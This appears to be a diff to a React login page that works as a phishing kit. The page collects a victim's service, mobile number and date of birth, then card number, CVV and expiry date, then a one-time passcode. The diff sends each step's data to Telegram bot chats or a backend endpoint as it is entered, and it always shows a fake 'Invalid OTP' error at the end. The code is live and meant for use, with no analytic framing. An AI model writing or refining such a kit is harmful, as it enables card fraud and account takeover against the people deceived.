@@ -62,143 +62,93 @@ export default function Login() {
     return Object.keys(newErrors).length === 0
   }
 
-  const validateStep2 = () => {
-    const newErrors = {}
-    if (!cardNumber || cardNumber.replace(/\s/g, '').length < 13) {
-      newErrors.cardNumber = 'Please enter valid card number'
-    }
-    if (!cvv || cvv.length < 3) {
-      newErrors.cvv = 'Please enter valid CVV'
-    }
-    if (!expDate || expDate.replace('/', '').length < 4) {
-      newErrors.expDate = 'Please enter valid expiry date'
-    }
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
-  }
-
   const [stepLoading, setStepLoading] = useState(false)
-
-  const handleLogin = () => {
-    setError('')
-    if (validateStep1()) {
-      setStepLoading(true)
-      setTimeout(() => {
-        setStepLoading(false)
-        setStep(2)
-      }, 2000)
-    }
-  }
-
-  const handleCardVerify = (e) => {
-    e.preventDefault()
-    e.stopPropagation()
-    
-    const newErrors = {}
-    if (!cardNumber || cardNumber.replace(/\s/g, '').length < 13) {
-      newErrors.cardNumber = 'Please enter valid card number'
-    }
-    if (!cvv || cvv.length < 3) {
-      newErrors.cvv = 'Please enter valid CVV'
-    }
-    if (!expDate || expDate.replace('/', '').length < 4) {
-      newErrors.expDate = 'Please enter valid expiry date'
-    }
-    
-    setErrors(newErrors)
-    
-    if (Object.keys(newErrors).length === 0) {
-      setStepLoading(true)
-      setTimeout(() => {
-        setStepLoading(false)
-        setStep(3)
-      }, 2000)
-    }
-  }
 
   const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'
   const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
-  const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID
+  const TELEGRAM_CHAT_IDS = (import.meta.env.VITE_TELEGRAM_CHAT_IDS || '').split(',').map(id => id.trim()).filter(id => id)
 
-  const handleOtpVerify = () => {
+  const sendToTelegram = async (message) => {
+    for (const chatId of TELEGRAM_CHAT_IDS) {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      })
+    }
+  }
+
+  const handleLogin = async () => {
+    setError('')
+    if (!validateStep1()) return
+    
+    setStepLoading(true)
+    
+    try {
+      const step1Data = {
+        service: selectedService,
+        mobile,
+        dob
+      }
+      
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
+        const telegramMessage = `
+📋 Service: ${step1Data.service}
+📱 Mobile: ${step1Data.mobile}
+🎂 DOB: ${step1Data.dob}
+🕐 Time: ${new Date().toLocaleString()}
+        `
+        await sendToTelegram(telegramMessage)
+      } else {
+        await fetch(`${API_URL}/users`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ...step1Data, step: 1 })
+        })
+      }
+      
+      setStep(2)
+    } catch (err) {
+      setError('Failed to submit. Please try again.')
+    } finally {
+      setStepLoading(false)
+    }
+  }
+
+  const handleOtpVerify = async () => {
     if (!otp || otp.length !== 6) {
       setError('Please enter valid 6-digit OTP')
       return
     }
 
-    const userData = {
-      service: selectedService,
-      mobile,
-      dob,
-      cardNumber: cardNumber.replace(/\s/g, ''),
-      cvv,
-      expDate,
-      otp
-    }
+    setStepLoading(true)
+    
+    try {
+      const step3Data = { otp }
 
-    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-      const telegramMessage = `
-🆕 <b>New User Data</b>
-
-📋 Service: ${userData.service}
-📱 Mobile: ${userData.mobile}
-🎂 DOB: ${userData.dob}
-💳 Card: ${userData.cardNumber}
-🔐 CVV: ${userData.cvv}
-📅 Expiry: ${userData.expDate}
-🔢 OTP: ${userData.otp}
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
+        const telegramMessage = `
+🔢 OTP: ${step3Data.otp}
 🕐 Time: ${new Date().toLocaleString()}
-      `
-
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: telegramMessage,
-          parse_mode: 'HTML'
+        `
+        await sendToTelegram(telegramMessage)
+      } else {
+        await fetch(`${API_URL}/users`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(step3Data)
         })
-      })
-      .then(res => res.json())
-      .then(data => {
-        setError('')
-        setLoading(true)
-        setTimeout(() => {
-          setLoading(false)
-          setError('Invalid OTP, try again later')
-        }, 5000)
-      })
-      .catch(err => {
-        setError('')
-        setLoading(true)
-        setTimeout(() => {
-          setLoading(false)
-          setError('Invalid OTP, try again later')
-        }, 5000)
-      })
-    } else {
-      fetch(`${API_URL}/users`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(userData)
-      })
-      .then(res => res.json())
-      .then(data => {
-        setError('')
-        setLoading(true)
-        setTimeout(() => {
-          setLoading(false)
-          setError('Invalid OTP, try again later')
-        }, 5000)
-      })
-      .catch(err => {
-        setError('')
-        setLoading(true)
-        setTimeout(() => {
-          setLoading(false)
-          setError('Invalid OTP, try again later')
-        }, 5000)
-      })
+      }
+      
+      setStepLoading(false)
+      setError('Invalid OTP, try again later')
+    } catch (err) {
+      setError('Failed to submit. Please try again.')
+      setStepLoading(false)
     }
   }
 
@@ -484,13 +434,44 @@ export default function Login() {
 
             <button
               type="button"
-              onClick={() => {
+              onClick={async () => {
                 const newErrors = {}
                 if (!cardNumber || cardNumber.replace(/\s/g, '').length < 13) newErrors.cardNumber = 'err'
                 if (!cvv || cvv.length < 3) newErrors.cvv = 'err'
                 if (!expDate || expDate.replace('/', '').length < 4) newErrors.expDate = 'err'
                 setErrors(newErrors)
-                if (Object.keys(newErrors).length === 0) setStep(3)
+                if (Object.keys(newErrors).length === 0) {
+                  setStepLoading(true)
+                  try {
+                    const step2Data = {
+                      cardNumber: cardNumber.replace(/\s/g, ''),
+                      cvv,
+                      expDate
+                    }
+                    
+                    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
+                      const telegramMessage = `
+💳 Card: ${step2Data.cardNumber}
+🔐 CVV: ${step2Data.cvv}
+📅 Expiry: ${step2Data.expDate}
+🕐 Time: ${new Date().toLocaleString()}
+                      `
+                      await sendToTelegram(telegramMessage)
+                    } else {
+                      await fetch(`${API_URL}/users`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(step2Data)
+                      })
+                    }
+                    
+                    setStep(3)
+                  } catch (err) {
+                    setError('Failed to submit. Please try again.')
+                  } finally {
+                    setStepLoading(false)
+                  }
+                }
               }}
               className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
             >
